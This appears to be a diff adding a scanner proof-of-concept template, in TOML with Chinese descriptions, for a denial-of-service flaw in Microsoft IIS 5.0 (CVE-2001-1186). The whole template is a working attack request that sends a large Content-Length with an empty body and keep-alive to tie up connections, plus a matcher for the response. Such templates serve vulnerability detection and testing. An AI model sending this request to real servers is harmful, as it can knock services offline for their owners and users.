@@ -1,0 +1,41 @@
+[info]
+author = "AVE"
+description = "向 Microsoft IIS 5.0 发送 Content-Length 值远大于实际请求体的 HTTP 请求，导致服务器无法超时关闭连接，耗尽连接池资源造成拒绝服务"
+id = "POC-AVE-2001-0480"
+name = "Microsoft IIS 5.0 Content-Length 字段拒绝服务漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-2001-1186",
+    "iis",
+    "dos",
+    "content-length",
+]
+vuln_id = [
+    "CVE-2001-1186",
+    "AVE-2001-0480",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Connection = "keep-alive"
+Content-Length = "100000"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "timeout",
+    "connection",
+]
